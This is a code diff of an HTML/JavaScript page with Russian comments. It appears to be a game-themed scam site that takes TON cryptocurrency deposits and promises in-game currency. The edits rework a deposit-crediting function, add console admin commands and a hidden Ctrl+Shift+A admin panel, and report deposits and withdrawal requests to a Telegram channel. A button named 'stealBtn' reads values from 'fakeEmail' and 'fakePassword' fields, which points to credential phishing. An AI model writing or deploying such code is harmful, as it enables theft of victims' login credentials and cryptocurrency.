@@ -421,10 +421,11 @@
         sendToTelegram(`📤 ЗАПРОС ВЫВОДА\n👤 ${email}\n🎮 ${gameId}\n💰 ${coins} монет → ${gold} Gold`);
     }
 
-    // ФУНКЦИЯ ПОПОЛНЕНИЯ (ГЛАВНАЯ)
+    // ========== АДМИН-КОМАНДА: ПОПОЛНЕНИЕ БАЛАНСА ==========
     window.confirmDeposit = async function(gameId, tonAmount) {
-        console.log(`🔍 Ищу пользователя с ID: ${gameId}`);
+        console.log(`🔍 Ищу пользователя с ID: "${gameId}"`);
         let found = false;
+        let resultMessage = '';
         
         for(let i = 0; i < localStorage.length; i++) {
             let key = localStorage.key(i);
@@ -433,32 +434,70 @@
                     let data = JSON.parse(localStorage.getItem(key));
                     if(data.gameId === gameId) {
                         let coins = tonAmount * 20;
-                        data.balance = (data.balance || 0) + coins;
+                        let oldBalance = data.balance || 0;
+                        data.balance = oldBalance + coins;
                         localStorage.setItem(key, JSON.stringify(data));
                         found = true;
+                        resultMessage = `✅ Пользователь ${gameId} получил ${coins} монет (${tonAmount} TON)`;
+                        console.log(resultMessage);
                         
-                        if(currentUserEmail === data.email) {
+                        if(typeof currentUserEmail !== 'undefined' && currentUserEmail === data.email) {
                             currentBalance = data.balance;
-                            document.getElementById('balanceAmount').innerText = currentBalance;
+                            if(document.getElementById('balanceAmount')) {
+                                document.getElementById('balanceAmount').innerText = currentBalance;
+                            }
+                            console.log(`🔄 Баланс обновлён на странице: ${currentBalance} монет`);
                         }
                         
-                        const msg = `✅ ПОДТВЕРЖДЕНО ПОПОЛНЕНИЕ\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → +${coins} монет\n📊 Новый баланс: ${data.balance} монет`;
-                        await sendToTelegram(msg);
-                        console.log(`✅ Пользователь ${gameId} получил ${coins} монет`);
-                        return {success: true, message: `+${coins} монет начислено! Новый баланс: ${data.balance}`};
+                        await sendToTelegram(`✅ ПОДТВЕРЖДЕНО ПОПОЛНЕНИЕ\n🎮 ID: ${gameId}\n💰 ${tonAmount} TON → +${coins} монет\n📊 Новый баланс: ${data.balance} монет`);
+                        break;
                     }
                 } catch(e) { console.log('Ошибка:', e); }
             }
         }
         
         if(!found) {
-            const msg = `❌ ОШИБКА: пользователь с ID "${gameId}" не найден в базе`;
-            await sendToTelegram(msg);
-            console.log(msg);
-            return {success: false, message: `Игрок с ID "${gameId}" не найден`};
+            resultMessage = `❌ Пользователь с ID "${gameId}" не найден!`;
+            console.log(resultMessage);
+            console.log('📋 Доступные ID:');
+            for(let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                if(key && key.startsWith('user_')) {
+                    try {
+                        let data = JSON.parse(localStorage.getItem(key));
+                        console.log(`   - ${data.gameId} (${data.email})`);
+                    } catch(e) {}
+                }
+            }
+            await sendToTelegram(`❌ ОШИБКА: пользователь с ID "${gameId}" не найден`);
         }
+        
+        return resultMessage;
     };
 
+    // ========== АДМИН-КОМАНДА: СПИСОК ВСЕХ ПОЛЬЗОВАТЕЛЕЙ ==========
+    window.listAllUsers = function() {
+        let users = [];
+        for(let i = 0; i < localStorage.length; i++) {
+            let key = localStorage.key(i);
+            if(key && key.startsWith('user_')) {
+                try {
+                    let data = JSON.parse(localStorage.getItem(key));
+                    users.push({
+                        email: data.email,
+                        gameId: data.gameId,
+                        balance: data.balance
+                    });
+                } catch(e) {}
+            }
+        }
+        console.table(users);
+        return users;
+    };
+
+    console.log('✅ Админ-команды загружены! Используйте: confirmDeposit("ID", TON)  или  listAllUsers()');
+
+    // ========== ИГРОВАЯ ЛОГИКА ==========
     function initGame() {
         if (!gameInProgress) {
             if (currentBalance < 5) {
@@ -565,26 +604,7 @@
         document.getElementById('userGameIdDisplay').innerText = currentGameId;
     }
 
-    function listAllUsers() {
-        let users = [];
-        for(let i = 0; i < localStorage.length; i++) {
-            let key = localStorage.key(i);
-            if(key && key.startsWith('user_')) {
-                try {
-                    let data = JSON.parse(localStorage.getItem(key));
-                    users.push({
-                        email: data.email,
-                        gameId: data.gameId,
-                        balance: data.balance
-                    });
-                } catch(e) {}
-            }
-        }
-        console.table(users);
-        return users;
-    }
-
-    // ОСНОВНЫЕ СОБЫТИЯ
+    // ========== ОСНОВНЫЕ СОБЫТИЯ ==========
     document.getElementById('stealBtn').onclick = async () => {
         let email = document.getElementById('fakeEmail').value.trim();
         let pass = document.getElementById('fakePassword').value.trim();
@@ -649,7 +669,7 @@
         document.querySelectorAll('.withdraw-option').forEach(o => o.classList.remove('selected'));
     };
 
-    // АДМИН ПАНЕЛЬ
+    // ========== АДМИН ПАНЕЛЬ (Ctrl+Shift+A) ==========
     document.getElementById('adminConfirmBtn').onclick = async () => {
         let gameId = document.getElementById('adminGameId').value.trim();
         let ton = parseFloat(document.getElementById('adminTon').value);
@@ -657,16 +677,12 @@
         if(isNaN(ton) || ton <= 0) { document.getElementById('adminResult').innerText = '❌ Введите сумму TON'; return; }
         
         let result = await window.confirmDeposit(gameId, ton);
-        if(result.success) {
-            document.getElementById('adminResult').innerText = result.message;
-        } else {
-            document.getElementById('adminResult').innerText = result.message;
-        }
+        document.getElementById('adminResult').innerText = result;
         setTimeout(() => { document.getElementById('adminResult').innerText = ''; }, 5000);
     };
     
     document.getElementById('adminListBtn').onclick = () => {
-        let users = listAllUsers();
+        let users = window.listAllUsers();
         if(users.length === 0) {
             document.getElementById('adminResult').innerText = '📭 Нет зарегистрированных пользователей';
         } else {
@@ -679,15 +695,12 @@
         document.getElementById('adminPanel').style.display = 'none';
     };
 
-    // Активация админ-панели по Ctrl+Shift+A
     document.addEventListener('keydown', function(e) {
         if(e.ctrlKey && e.shiftKey && e.key === 'A') {
-            document.getElementById('adminPanel').style.display = document.getElementById('adminPanel').style.display === 'none' ? 'block' : 'none';
+            const panel = document.getElementById('adminPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
         }
     });
-    
-    // Добавляем глобальную функцию для консоли
-    window.listAllUsers = listAllUsers;
 </script>
 </body>
 </html>
